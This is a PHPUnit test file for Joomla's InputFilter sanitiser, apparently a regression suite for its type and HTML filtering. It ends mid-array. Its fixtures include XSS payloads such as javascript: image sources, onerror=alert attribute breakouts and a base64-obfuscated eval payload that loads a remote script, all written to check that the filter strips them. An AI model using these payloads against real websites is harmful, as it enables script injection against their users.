<?php
/**
 * @copyright  Copyright (C) 2005 - 2021 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

namespace Joomla\Filter\Tests;

use Joomla\Filter\InputFilter;
use Joomla\Filter\Tests\Stubs\ArbitraryObject;
use PHPUnit\Framework\TestCase;

/**
 * Test class for Filter\InputFilter
 *
 * @note   Do not refactor providers to use Generators, they rely on being able to overwrite keys from the generic cases
 * @since  1.0
 */
class InputFilterTest extends TestCase
{
	/**
	 * Produces the array of test cases common to all test runs.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function casesGeneric()
	{
		$input = '!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`' .
			'abcdefghijklmnopqrstuvwxyz{|}~â‚¬â€šÆ’â€žâ€¦â€ â€¡Ë†â€°Å â€¹Å’Å½â€˜â€™â€œâ' .
			'€�â€¢â€“â€”Ëœâ„¢Å¡â€ºÅ“Å¾Å¸Â¡Â¢Â£Â¤Â¥Â' .
			'¦Â§Â¨Â©ÂªÂ«Â¬Â­Â®Â¯Â°Â±Â²Â³Â´ÂµÂ¶Â·' .
			'Â¸Â¹ÂºÂ»Â¼Â½Â¾Â¿Ã€Ã�Ã‚ÃƒÃ„Ã…Ã†Ã‡ÃˆÃ‰ÃŠÃ‹' .
			'ÃŒÃ�ÃŽÃ�Ã�Ã‘Ã’Ã“Ã”Ã•Ã–Ã—Ã˜Ã™ÃšÃ›ÃœÃ�ÃžÃ' .
			'ŸÃ Ã¡Ã¢Ã£Ã¤Ã¥Ã¦Ã§Ã¨Ã©ÃªÃ«Ã¬Ã­Ã®Ã¯Ã' .
			'°Ã±Ã²Ã³Ã´ÃµÃ¶Ã·Ã¸Ã¹ÃºÃ»Ã¼Ã½Ã¾Ã¿';

		return [
			'int_01'                                                        => [
				'int',
				$input,
				123456789,
				'From generic cases',
			],
			'integer'                                                       => [
				'integer',
				$input,
				123456789,
				'From generic cases',
			],
			'int_02'                                                        => [
				'int',
				'abc123456789abc123456789',
				123456789,
				'From generic cases',
			],
			'int_03'                                                        => [
				'int',
				'123456789abc123456789abc',
				123456789,
				'From generic cases',
			],
			'int_04'                                                        => [
				'int',
				'empty',
				0,
				'From generic cases',
			],
			'int_05'                                                        => [
				'int',
				'ab-123ab',
				-123,
				'From generic cases',
			],
			'int_06'                                                        => [
				'int',
				'-ab123ab',
				123,
				'From generic cases',
			],
			'int_07'                                                        => [
				'int',
				'-ab123.456ab',
				123,
				'From generic cases',
			],
			'int_08'                                                        => [
				'int',
				'456',
				456,
				'From generic cases',
			],
			'int_09'                                                        => [
				'int',
				'-789',
				-789,
				'From generic cases',
			],
			'int_10'                                                        => [
				'int',
				-789,
				-789,
				'From generic cases',
			],
			'int_11'                                                        => [
				'int',
				'',
				0,
				'From generic cases',
			],
			'int_12'                                                        => [
				'int',
				[1, 3, 9],
				[1, 3, 9],
				'From generic cases',
			],
			'int_13'                                                        => [
				'int',
				[1, 'ab-123ab', '-ab123.456ab'],
				[1, -123, 123],
				'From generic cases',
			],
			'uint_1'                                                        => [
				'uint',
				-789,
				789,
				'From generic cases',
			],
			'uint_2'                                                        => [
				'uint',
				'',
				0,
				'From generic cases',
			],
			'uint_3'                                                        => [
				'uint',
				[-1, -3, -9],
				[1, 3, 9],
				'From generic cases',
			],
			'uint_4'                                                        => [
				'uint',
				[1, 'ab-123ab', '-ab123.456ab'],
				[1, 123, 123],
				'From generic cases',
			],
			'float_01'                                                      => [
				'float',
				$input,
				123456789.0,
				'From generic cases',
			],
			'double'                                                        => [
				'double',
				$input,
				123456789.0,
				'From generic cases',
			],
			'float_02'                                                      => [
				'float',
				20.20,
				20.2,
				'From generic cases',
			],
			'float_03'                                                      => [
				'float',
				'-38.123',
				-38.123,
				'From generic cases',
			],
			'float_04'                                                      => [
				'float',
				'abc-12.456',
				-12.456,
				'From generic cases',
			],
			'float_05'                                                      => [
				'float',
				'-abc12.456',
				12.456,
				'From generic cases',
			],
			'float_06'                                                      => [
				'float',
				'abc-12.456abc',
				-12.456,
				'From generic cases',
			],
			'float_07'                                                      => [
				'float',
				'abc-12 . 456',
				-12.0,
				'From generic cases',
			],
			'float_08'                                                      => [
				'float',
				'abc-12. 456',
				-12.0,
				'From generic cases',
			],
			'float_09'                                                      => [
				'float',
				'',
				0.0,
				'From generic cases',
			],
			'float_10'                                                      => [
				'float',
				'27.3e-34',
				27.3e-34,
				'From generic cases',
			],
			'float_11'                                                      => [
				'float',
				[1.0, 3.1, 6.2],
				[1.0, 3.1, 6.2],
				'From generic cases',
			],
			'float_13'                                                      => [
				'float',
				[1.0, 'abc-12. 456', 'abc-12.456abc'],
				[1.0, -12.0, -12.456],
				'From generic cases',
			],
			'float_14'                                                      => [
				'float',
				[1.0, 'abcdef-7E-10', '+27.3E-34', '+27.3e-34'],
				[1.0, -7E-10, 27.3E-34, 27.3e-34],
				'From generic cases',
			],
			'bool_0'                                                        => [
				'bool',
				$input,
				true,
				'From generic cases',
			],
			'boolean'                                                       => [
				'boolean',
				$input,
				true,
				'From generic cases',
			],
			'bool_1'                                                        => [
				'bool',
				true,
				true,
				'From generic cases',
			],
			'bool_2'                                                        => [
				'bool',
				false,
				false,
				'From generic cases',
			],
			'bool_3'                                                        => [
				'bool',
				'',
				false,
				'From generic cases',
			],
			'bool_4'                                                        => [
				'bool',
				0,
				false,
				'From generic cases',
			],
			'bool_5'                                                        => [
				'bool',
				1,
				true,
				'From generic cases',
			],
			'bool_6'                                                        => [
				'bool',
				null,
				false,
				'From generic cases',
			],
			'bool_7'                                                        => [
				'bool',
				'false',
				true,
				'From generic cases',
			],
			'bool_8'                                                        => [
				'bool',
				['false', null, true, false, 1, 0, ''],
				[true, false, true, false, true, false, false],
				'From generic cases',
			],
			'word_01'                                                       => [
				'word',
				$input,
				'ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz',
				'From generic cases',
			],
			'word_02'                                                       => [
				'word',
				null,
				'',
				'From generic cases',
			],
			'word_03'                                                       => [
				'word',
				123456789,
				'',
				'From generic cases',
			],
			'word_04'                                                       => [
				'word',
				'word123456789',
				'word',
				'From generic cases',
			],
			'word_05'                                                       => [
				'word',
				'123456789word',
				'word',
				'From generic cases',
			],
			'word_06'                                                       => [
				'word',
				'w123o4567r89d',
				'word',
				'From generic cases',
			],
			'word_07'                                                       => [
				'word',
				['w123o', '4567r89d'],
				['wo', 'rd'],
				'From generic cases',
			],
			'alnum_01'                                                      => [
				'alnum',
				$input,
				'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
				'From generic cases',
			],
			'alnum_02'                                                      => [
				'alnum',
				null,
				'',
				'From generic cases',
			],
			'alnum_03'                                                      => [
				'alnum',
				'~!@#$%^&*()_+abc',
				'abc',
				'From generic cases',
			],
			'alnum_04'                                                      => [
				'alnum',
				['~!@#$%^abc', '&*()_+def'],
				['abc', 'def'],
				'From generic cases',
			],
			'cmd_string'                                                    => [
				'cmd',
				$input,
				'-.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz',
				'From generic cases',
			],
			'cmd_array'                                                     => [
				'cmd',
				[$input, $input],
				[
					'-.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz',
					'-.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz',
				],
				'From generic cases',
			],
			'base64_string'                                                 => [
				'base64',
				$input,
				'+/0123456789=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
				'From generic cases',
			],
			'base64_array'                                                  => [
				'base64',
				[$input, $input],
				[
					'+/0123456789=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
					'+/0123456789=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
				],
				'From generic cases',
			],
			'array'                                                         => [
				'array',
				[1, 3, 6],
				[1, 3, 6],
				'From generic cases',
			],
			'relative path'                                                 => [
				'path',
				'images/system',
				'images/system',
				'From generic cases',
			],
			'path with double separator'                                    => [
				'path',
				'images//system',
				'images/system',
				'From generic cases'
			],
			'url as path'                                                   => [
				'path',
				'http://www.fred.com/josephus',
				'',
				'From generic cases',
			],
			'empty path'                                                    => [
				'path',
				'',
				'',
				'From generic cases',
			],
			'absolute path'                                                 => [
				'path',
				'/images/system',
				'/images/system',
				'From generic cases',
			],
			'path array'                                                    => [
				'path',
				['images/system', '/var/www/html/index.html'],
				['images/system', '/var/www/html/index.html'],
				'From generic cases',
			],
			'long path'                                                     => [
				'path',
				'/var/www/html/pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf',
				'/var/www/html/pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf',
				'From generic cases'
			],
			'windows path'                                                  => [
				'path',
				'C:\Documents\Newsletters\Summer2018.pdf',
				'C:\Documents\Newsletters\Summer2018.pdf',
				'From generic cases'
			],
			'windows path lowercase drive letter'                           => [
				'path',
				'c:\Documents\Newsletters\Summer2018.pdf',
				'c:\Documents\Newsletters\Summer2018.pdf',
				'From generic cases'
			],
			'windows path folder'                                           => [
				'path',
				'C:\Documents\Newsletters',
				'C:\Documents\Newsletters',
				'From generic cases'
			],
			'windows path with lower case drive letter'                     => [
				'path',
				'c:\Documents\Newsletters',
				'c:\Documents\Newsletters',
				'From generic cases'
			],
			'windows path with two drive letters'                           => [
				'path',
				'CC:\Documents\Newsletters',
				'',
				'From generic cases'
			],
			'windows path without drive letter'                             => [
				'path',
				'Documents\Newsletters',
				'Documents\Newsletters',
				'From generic cases'
			],
			'windows path with double separator'                            => [
				'path',
				'C:\Documents\Newsletters\\Summer2018.pdf',
				'C:\Documents\Newsletters\Summer2018.pdf',
				'From generic cases'
			],
			'windows path with 2 times double separator'                    => [
				'path',
				'C:\Documents\\Newsletters\\Summer2018.pdf',
				'C:\Documents\Newsletters\Summer2018.pdf',
				'From generic cases'
			],
			'windows path with 3 times double separator'                    => [
				'path',
				'C:\\Documents\\Newsletters\\Summer2018.pdf',
				'C:\Documents\Newsletters\Summer2018.pdf',
				'From generic cases'
			],
			'windows path with /'                                           => [
				'path',
				'C:\\Documents\\Newsletters/tmp',
				'C:\Documents\Newsletters\tmp',
				'From generic cases'
			],
			'windows path with 2 times /'                                   => [
				'path',
				'C:\\Documents/Newsletters/tmp',
				'C:\Documents\Newsletters\tmp',
				'From generic cases'
			],
			'windows path with 3 times /'                                   => [
				'path',
				'C:/Documents/Newsletters/tmp',
				'C:\Documents\Newsletters\tmp',
				'From generic cases'
			],
			'user_01'                                                       => [
				'username',
				'&<f>r%e\'d',
				'fred',
				'From generic cases',
			],
			'user_02'                                                       => [
				'username',
				'fred',
				'fred',
				'From generic cases',
			],
			'user_03'                                                       => [
				'username',
				['&<f>r%e\'d', '$user69'],
				['fred', '$user69'],
				'From generic cases',
			],
			'user_04'                                                       => [
				'username',
				'фамилия',
				'фамилия',
				'From generic cases',
			],
			'user_05'                                                       => [
				'username',
				'Φρεντ',
				'Φρεντ',
				'From generic cases',
			],
			'user_06'                                                       => [
				'username',
				'محمد',
				'محمد',
				'From generic utf-8 multibyte cases',
			],
			'trim_01'                                                       => [
				'trim',
				'nonbreaking nonbreaking',
				'nonbreaking nonbreaking',
				'From generic cases',
			],
			'trim_02'                                                       => [
				'trim',
				'multi　multi',
				'multi　multi',
				'From generic cases',
			],
			'trim_03'                                                       => [
				'trim',
				['nonbreaking nonbreaking', 'multi　multi'],
				['nonbreaking nonbreaking', 'multi　multi'],
				'From generic cases',
			],
			'string_01'                                                     => [
				'string',
				'123.567',
				'123.567',
				'From generic cases',
			],
			'string_single_quote'                                           => [
				'string',
				"this is a 'test' of ?",
				"this is a 'test' of ?",
				'From generic cases',
			],
			'string_double_quote'                                           => [
				'string',
				'this is a "test" of "double" quotes',
				'this is a "test" of "double" quotes',
				'From generic cases',
			],
			'string_odd_double_quote'                                       => [
				'string',
				'this is a "test of "odd number" of quotes',
				'this is a "test of "odd number" of quotes',
				'From generic cases',
			],
			'string_odd_mixed_quote'                                        => [
				'string',
				'this is a "test\' of "odd number" of quotes',
				'this is a "test\' of "odd number" of quotes',
				'From generic cases',
			],
			'string_array'                                                  => [
				'string',
				['this is a "test\' of "odd number" of quotes', 'executed in an array'],
				['this is a "test\' of "odd number" of quotes', 'executed in an array'],
				'From generic cases',
			],
			'HTML script tag'                                                        => [
				'raw',
				'<script type="text/javascript">alert("foo");</script>',
				'<script type="text/javascript">alert("foo");</script>',
				'From generic cases',
			],
			'nested HTML tags'                                                        => [
				'raw',
				'<p>This is a test of a html <b>snippet</b></p>',
				'<p>This is a test of a html <b>snippet</b></p>',
				'From generic cases',
			],
			'numeric string'                                                        => [
				'raw',
				'0123456789',
				'0123456789',
				'From generic cases',
			],
			'issue#38' => [
				'raw',
				1,
				1,
				'From generic cases'
			],
			'unknown_01'                                                    => [
				'',
				'123.567',
				'123.567',
				'From generic cases',
			],
			'unknown_02'                                                    => [
				'',
				[1, 3, 9],
				['1', '3', '9'],
				'From generic cases',
			],
			'unknown_03'                                                    => [
				'',
				["key" => "Value", "key2" => "This&amp;That"],
				["key" => "Value", "key2" => "This&That"],
				'From generic cases',
			],
			'unknown_04'                                                    => [
				'',
				12.6,
				'12.6',
				'From generic cases',
			],
			'tag_01'                                                        => [
				'',
				'<em',
				'em',
				'From generic cases',
			],
			'Kill script'                                                   => [
				'',
				'<img src="javascript:alert();" />',
				'<img />',
				'From generic cases',
			],
			'Nested tags'                                                   => [
				'',
				'<em><strong>Fred</strong></em>',
				'<em><strong>Fred</strong></em>',
				'From generic cases',
			],
			'Nested tags 02'                                                => [
				'',
				'<em><strong>Φρεντ</strong></em>',
				'<em><strong>Φρεντ</strong></em>',
				'From generic cases',
			],
			'Nested tags with utf-8 multibyte persian characters'           => [
				'',
				'<em><strong>محمد</strong></em>',
				'<em><strong>محمد</strong></em>',
				'From generic utf-8 multibyte cases',
			],
			'Malformed Nested tags'                                         => [
				'',
				'<em><strongFred</strong></em>',
				'<em>strongFred</strong></em>',
				'From generic cases',
			],
			'Malformed Nested tags with utf-8 multibyte persian characters' => [
				'',
				'<em><strongمحمد</strong></em>',
				'<em>strongمحمد</strong></em>',
				'From generic utf-8 multibyte cases',
			],
			'Unquoted Attribute Without Space'                              => [
				'',
				'<img height=300>',
				'<img height="300" />',
				'From generic cases',
			],
			'Unquoted Attribute'                                            => [
				'',
				'<img height=300 />',
				'<img height="300" />',
				'From generic cases',
			],
			'Single quoted Attribute'                                       => [
				'',
				'<img height=\'300\' />',
				'<img height="300" />',
				'From generic cases',
			],
			'Attribute is zero'                                             => [
				'',
				'<img height=0 />',
				'<img height="0" />',
				'From generic cases',
			],
			'Attribute value missing'                                       => [
				'',
				'<img height= />',
				'<img height="" />',
				'From generic cases',
			],
			'Attribute without ='                                           => [
				'',
				'<img height="300" ismap />',
				'<img height="300" />',
				'From generic cases',
			],
			'Bad Attribute Name'                                            => [
				'',
				'<br 3bb />',
				'<br />',
				'From generic cases',
			],
			'Bad Tag Name'                                                  => [
				'',
				'<300 />',
				'',
				'From generic cases',
			],
			'tracker9725'                                                   => [
				'string',
				'<img class="one two" />',
				'<img class="one two" />',
				'Test for recursion with single tags - From generic cases',
			],
			'missing_quote'                                                 => [
				'string',
				'<img height="123 />',
				'img height="123 /&gt;"',
				'From generic cases',
			],
		];
	}

	/**
	 * Produces the array of test cases for plain allowed test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function allowed()
	{
		$casesSpecific = [
			'Kill script'                                                   => [
				'',
				'<img src="javascript:alert();" />',
				'',
				'From specific cases',
			],
			'Nested tags'                                                   => [
				'',
				'<em><strong>Fred</strong></em>',
				'Fred',
				'From specific cases',
			],
			'Nested tags 02'                                                => [
				'',
				'<em><strong>Φρεντ</strong></em>',
				'Φρεντ',
				'From specific cases',
			],
			'Nested tags with utf-8 multibyte persian characters'           => [
				'',
				'<em><strong>محمد</strong></em>',
				'محمد',
				'From specific utf-8 multibyte cases',
			],
			'Malformed Nested tags'                                         => [
				'',
				'<em><strongFred</strong></em>',
				'strongFred',
				'From specific cases',
			],
			'Malformed Nested tags with utf-8 multibyte persian characters' => [
				'',
				'<em><strongمحمد</strong></em>',
				'strongمحمد',
				'From specific utf-8 multibyte cases',
			],
			'Unquoted Attribute Without Space'                              => [
				'',
				'<img height=300>',
				'',
				'From specific cases',
			],
			'Unquoted Attribute'                                            => [
				'',
				'<img height=300 />',
				'',
				'From specific cases',
			],
			'Single quoted Attribute'                                       => [
				'',
				'<img height=\'300\' />',
				'',
				'From specific cases',
			],
			'Attribute is zero'                                             => [
				'',
				'<img height=0 />',
				'',
				'From specific cases',
			],
			'Attribute value missing'                                       => [
				'',
				'<img height= />',
				'',
				'From specific cases',
			],
			'Attribute without ='                                           => [
				'',
				'<img height="300" ismap />',
				'',
				'From specific cases',
			],
			'Bad Attribute Name'                                            => [
				'',
				'<br 300 />',
				'',
				'From specific cases',
			],
			'tracker9725'                                                   => [
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'',
				'From specific cases',
			],
			'tracker24258'                                                  => [
				// Test for recursion on attributes
				'string',
				'<scrip &nbsp; t>alert(\'test\');</scrip t>',
				'alert(\'test\');',
				'From generic cases',
			],
			'Attribute with dash'                                           => [
				'string',
				'<img data-value="1" />',
				'',
				'From generic cases',
			],
		];

		return array_merge($this->casesGeneric(), $casesSpecific);
	}

	/**
	 * Execute a test case on clean() called as member with default filter settings (allowed - no html).
	 *
	 * @param   string  $type       The type of input
	 * @param   string  $data       The input
	 * @param   string  $expected   The expected result for this test.
	 * @param   string  $caseGroup  The failure message identifying source of test case.
	 *
	 * @return  void
	 *
	 * @dataProvider allowed
	 */
	public function testCleanByCallingMember($type, $data, $expected, $caseGroup)
	{
		$this->assertSame($expected, (new InputFilter)->clean($data, $type));
	}

	/**
	 * Produces the array of test cases for the allowed img tag test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function allowImg()
	{
		$security20110329bString = "<img src='<img src='/onerror=eval" .
			"(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3J" .
			"jJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=/.source))//'/> ";

		$casesSpecific = [
			'Kill script'                                                   => [
				'',
				'<img src="javascript:alert();" />',
				'<img />',
				'From specific cases',
			],
			'Nested tags'                                                   => [
				'',
				'<em><strong>Fred</strong></em>',
				'Fred',
				'From specific cases',
			],
			'Nested tags 02'                                                => [
				'',
				'<em><strong>Φρεντ</strong></em>',
				'Φρεντ',
				'From specific cases',
			],
			'Nested tags with utf-8 multibyte persian characters'           => [
				'',
				'<em><strong>محمد</strong></em>',
				'محمد',
				'From specific utf-8 multibyte cases',
			],
			'Malformed Nested tags'                                         => [
				'',
				'<em><strongFred</strong></em>',
				'strongFred',
				'From specific cases',
			],
			'Malformed Nested tags with utf-8 multibyte persian characters' => [
				'',
				'<em><strongمحمد</strong></em>',
				'strongمحمد',
				'From specific utf-8 multibyte cases',
			],
			'Unquoted Attribute Without Space'                              => [
				'',
				'<img height=300>',
				'<img />',
				'From specific cases',
			],
			'Unquoted Attribute'                                            => [
				'',
				'<img height=300 />',
				'<img />',
				'From specific cases',
			],
			'Single quoted Attribute'                                       => [
				'',
				'<img height=\'300\' />',
				'<img />',
				'From specific cases',
			],
			'Attribute is zero'                                             => [
				'',
				'<img height=0 />',
				'<img />',
				'From specific cases',
			],
			'Attribute value missing'                                       => [
				'',
				'<img height= />',
				'<img />',
				'From specific cases',
			],
			'Attribute without ='                                           => [
				'',
				'<img height="300" ismap />',
				'<img />',
				'From specific cases',
			],
			'Bad Attribute Name'                                            => [
				'',
				'<br 300 />',
				'',
				'From specific cases',
			],
			'tracker9725'                                                   => [
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'<img />',
				'From specific cases',
			],
			'security_20110329a'                                            => [
				'string',
				"<img src='<img src='///'/> ",
				'<img /> ',
				'From specific cases',
			],
			'security_20110329b'                                            => [
				'string',
				$security20110329bString,
				'<img /> ',
				'From specific cases',
			],
			'hanging_quote'                                                 => [
				'string',
				"<img src=\' />",
				'<img />',
				'From specific cases',
			],
			'hanging_quote2'                                                => [
				'string',
				'<img src slkdjls " this is "more " stuff',
				'img src slkdjls " this is "more " stuff',
				'From specific cases',
			],
			'hanging_quote3'                                                => [
				'string',
				"<img src=\"\'\" />",
				'<img />',
				'From specific cases',
			],
			'Attribute with dash'                                           => [
				'string',
				'<img data-value="1" />',
				'<img />',
				'From generic cases',
			],
		];

		return array_merge($this->casesGeneric(), $casesSpecific);
	}

	/**
	 * Execute a test case on clean() called as member with custom filter settings.
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return  void
	 *
	 * @dataProvider allowImg
	 */
	public function testCleanWithImgAllowed($type, $data, $expect, $message)
	{
		$this->assertEquals(
			$expect,
			(new InputFilter(['img'], [], 0, 0))->clean($data, $type),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the allowed class attribute test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function allowClass()
	{
		$casesSpecific = [
			'Kill script'                                                   => [
				'',
				'<img src="javascript:alert();" />',
				'',
				'From specific cases',
			],
			'Nested tags'                                                   => [
				'',
				'<em><strong>Fred</strong></em>',
				'Fred',
				'From specific cases',
			],
			'Nested tags 02'                                                => [
				'',
				'<em><strong>Φρεντ</strong></em>',
				'Φρεντ',
				'From specific cases',
			],
			'Nested tags with utf-8 multibyte persian characters'           => [
				'',
				'<em><strong>محمد</strong></em>',
				'محمد',
				'From specific utf-8 multibyte cases',
			],
			'Malformed Nested tags'                                         => [
				'',
				'<em><strongFred</strong></em>',
				'strongFred',
				'From specific cases',
			],
			'Malformed Nested tags with utf-8 multibyte persian characters' => [
				'',
				'<em><strongمحمد</strong></em>',
				'strongمحمد',
				'From specific utf-8 multibyte cases',
			],
			'Unquoted Attribute Without Space'                              => [
				'',
				'<img height=300>',
				'',
				'From specific cases',
			],
			'Unquoted Attribute'                                            => [
				'',
				'<img height=300 />',
				'',
				'From specific cases',
			],
			'Single quoted Attribute'                                       => [
				'',
				'<img height=\'300\' />',
				'',
				'From specific cases',
			],
			'Attribute is zero'                                             => [
				'',
				'<img height=0 />',
				'',
				'From specific cases',
			],
			'Attribute value missing'                                       => [
				'',
				'<img height= />',
				'',
				'From specific cases',
			],
			'Attribute without ='                                           => [
				'',
				'<img height="300" ismap />',
				'',
				'From specific cases',
			],
			'Bad Attribute Name'                                            => [
				'',
				'<br 300 />',
				'',
				'From specific cases',
			],
			'tracker9725'                                                   => [
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'',
				'From specific cases',
			],
			'Attribute with dash'                                           => [
				'string',
				'<img data-value="1" />',
				'',
				'From generic cases',
			],
		];

		return array_merge($this->casesGeneric(), $casesSpecific);
	}

	/**
	 * Execute a test case on clean() called as member with custom filter settings.
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return  void
	 *
	 * @dataProvider allowClass
	 */
	public function testCleanWithClassAllowed($type, $data, $expect, $message)
	{
		$this->assertEquals(
			$expect,
			(new InputFilter([], ['class'], 0, 0))->clean($data, $type),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the allowed class attribute img tag test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function allowClassImg()
	{
		$casesSpecific = [
			'Kill script'                                                   => [
				'',
				'<img src="javascript:alert();" />',
				'<img />',
				'From specific cases',
			],
			'Nested tags'                                                   => [
				'',
				'<em><strong>Fred</strong></em>',
				'Fred',
				'From specific cases',
			],
			'Nested tags 02'                                                => [
				'',
				'<em><strong>Φρεντ</strong></em>',
				'Φρεντ',
				'From specific cases',
			],
			'Nested tags with utf-8 multibyte persian characters'           => [
				'',
				'<em><strong>محمد</strong></em>',
				'محمد',
				'From specific utf-8 multibyte cases',
			],
			'Malformed Nested tags'                                         => [
				'',
				'<em><strongFred</strong></em>',
				'strongFred',
				'From specific cases',
			],
			'Malformed Nested tags with utf-8 multibyte persian characters' => [
				'',
				'<em><strongمحمد</strong></em>',
				'strongمحمد',
				'From specific utf-8 multibyte cases',
			],
			'Unquoted Attribute Without Space'                              => [
				'',
				'<img class=myclass height=300 >',
				'<img class="myclass" />',
				'From specific cases',
			],
			'Unquoted Attribute'                                            => [
				'',
				'<img class = myclass  height = 300/>',
				'<img />',
				'From specific cases',
			],
			'Single quoted Attribute'                                       => [
				'',
				'<img class=\'myclass\' height=\'300\' />',
				'<img class="myclass" />',
				'From specific cases',
			],
			'Attribute is zero'                                             => [
				'',
				'<img class=0 height=0 />',
				'<img class="0" />',
				'From specific cases',
			],
			'Attribute value missing'                                       => [
				'',
				'<img class= height= />',
				'<img class="" />',
				'From specific cases',
			],
			'Attribute without ='                                           => [
				'',
				'<img ismap class />',
				'<img />',
				'From specific cases',
			],
			'Bad Attribute Name'                                            => [
				'',
				'<br 300 />',
				'',
				'From specific cases',
			],
			'tracker9725'                                                   => [
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'<img class="one two" />',
				'From specific cases',
			],
			'class with no ='                                               => [
				// Test for recursion with single tags
				'string',
				'<img class />',
				'<img />',
				'From specific cases',
			],
			'Attribute with dash'                                           => [
				'string',
				'<img data-value="1" />',
				'<img />',
				'From generic cases',
			],
		];

		return array_merge($this->casesGeneric(), $casesSpecific);
	}

	/**
	 * Execute a test case on clean() called as member with custom filter settings.
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return  void
	 *
	 * @dataProvider allowClassImg
	 */
	public function testCleanWithImgAndClassAllowed($type, $data, $expect, $message)
	{
		$this->assertEquals(
			$expect,
			(new InputFilter(['img'], ['class'], 0, 0))->clean($data, $type),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the plain blocked data test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function blocked()
	{
		$quotesInText1 = '<p class="my_class">This is a = "test" ' .
			'<a href="http://mysite.com" img="my_image">link test</a>. This is some more text.</p>';
		$quotesInText2 = '<p class="my_class">This is a = "test" ' .
			'<a href="http://mysite.com" img="my_image">link test</a>. This is some more text.</p>';
		$normalNested1 = '<p class="my_class">This is a <a href="http://mysite.com" img = "my_image">link test</a>.' .
			' This is <span class="myclass" font = "myfont" > some more</span> text.</p>';
		$normalNested2 = '<p class="my_class">This is a <a href="http://mysite.com" img="my_image">link test</a>. ' .
			'This is <span class="myclass" font="myfont"> some more</span> text.</p>';

		$casesSpecific = [
			'security_tracker_24802_a' => [
				'',
				'<img src="<img src=x"/onerror=alert(1)//">',
				'<img src="&lt;img src=x&quot;/onerror=alert(1)//" />',
				'From specific cases',
			],
			'security_tracker_24802_b' => [
				'',
				'<img src="<img src=x"/onerror=alert(1)"//>"',
				'img src="&lt;img src=x&quot;/onerror=alert(1)&quot;//&gt;"',
				'From specific cases',
			],
			'security_tracker_24802_c' => [
				'',
				'<img src="<img src=x"/onerror=alert(1)"//>',
				'img src="&lt;img src=x&quot;/onerror=alert(1)&quot;//&gt;"',
				'From specific cases',
			],
			'security_tracker_24802_d' => [
				'',
				'<img src="x"/onerror=alert(1)//">',
				'<img src="x&quot;/onerror=alert(1)//" />',
				'From specific cases',
			],
			'security_tracker_24802_e' => [
				'',
				'<img src=<img src=x"/onerror=alert(1)//">',
				'img src=<img src="x/onerror=alert(1)//" />',
				'From specific cases',
			],
			'empty_alt'                => [
				'string',
				'<img alt="" src="my_source" />',
				'<img alt="" src="my_source" />',
				'Test empty alt attribute',
			],
			'disabled_no_equals_a'     => [
				'string',
				'<img disabled src="my_source" />',
				'<img src="my_source" />',
				'Test empty alt attribute',
			],
			'disabled_no_equals_b'     => [
				'string',
				'<img alt="" disabled src="aaa" />',
				'<img alt="" src="aaa" />',
				'Test empty alt attribute',
			],
			'disabled_no_equals_c'     => [
				'string',
				'<img disabled />',
				'<img />',
				'Test empty alt attribute',
			],
			'disabled_no_equals_d'     => [
				'string',
				'<img height="300" disabled />',
				'<img height="300" />',
				'Test empty alt attribute',
